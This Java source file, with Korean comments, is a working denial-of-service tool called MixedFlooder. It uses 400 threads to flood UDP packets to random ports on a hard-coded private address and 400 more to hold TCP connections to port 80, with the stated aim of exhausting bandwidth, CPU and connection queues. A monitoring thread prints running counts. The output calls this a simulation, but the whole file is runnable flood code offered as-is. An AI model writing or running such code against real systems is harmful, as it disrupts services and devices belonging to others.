import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

public class MixedFlooder {

    // private static final String TARGET_IP = "192.168.40.1";
    private static final String TARGET_IP = "192.168.40.1";
    private static final int TARGET_PORT = 80; // 웹 관리 페이지 포트
    private static final int UDP_THREADS = 400;  // UDP 전송용 스레드
    private static final int TCP_THREADS = 400;  // TCP 연결 점유용 스레드

    private static AtomicInteger udpCount = new AtomicInteger(0);
    private static AtomicInteger tcpCount = new AtomicInteger(0);

    public static void main(String[] args) {
        System.out.println("[!] Mixed Flood 시뮬레이션 가동...");
        System.out.println(">> 타겟: " + TARGET_IP + " (Port: " + TARGET_PORT + ")");
        System.out.println(">> UDP 유닛: " + UDP_THREADS + " | TCP 유닛: " + TCP_THREADS);
        System.out.println("----------------------------------------------");

        ExecutorService udpExecutor = Executors.newFixedThreadPool(UDP_THREADS);
        ExecutorService tcpExecutor = Executors.newFixedThreadPool(TCP_THREADS);

        // 1. UDP Flood 가동 (대역폭 및 CPU 부하)
        for (int i = 0; i < UDP_THREADS; i++) {
            udpExecutor.execute(() -> {
                try {
                    byte[] data = new byte[1024]; // 1KB 더미 데이터
                    DatagramSocket socket = new DatagramSocket();
                    InetAddress address = InetAddress.getByName(TARGET_IP);

                    while (true) {
                        int port = (int) (Math.random() * 65534) + 1;
                        DatagramPacket packet = new DatagramPacket(data, data.length, address, port);
                        socket.send(packet);
                        udpCount.incrementAndGet();
                    }
                } catch (Exception e) {}
            });
        }

        // 2. TCP Connection Flood 가동 (대기열 및 메모리 점유)
        for (int i = 0; i < TCP_THREADS; i++) {
            tcpExecutor.execute(() -> {
                while (true) {
                    try (Socket socket = new Socket()) {
                        // 연결을 맺고 바로 끊지 않고 5초간 유지하여 서버 자원을 묶어둠
                        socket.connect(new InetSocketAddress(TARGET_IP, TARGET_PORT), 1000);
                        tcpCount.incrementAndGet();
                        Thread.sleep(5000);
                    } catch (Exception e) {
                        // 서버가 가득 차면 연결 거부 발생
                    }
                }
            });
        }

        // 상태 모니터링 스레드
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(2000);
                    System.out.println("[상태] UDP 발송: " + udpCount.get() + " | TCP 성공: " + tcpCount.get());
                } catch (Exception e) {}
            }
        }).start();
    }
}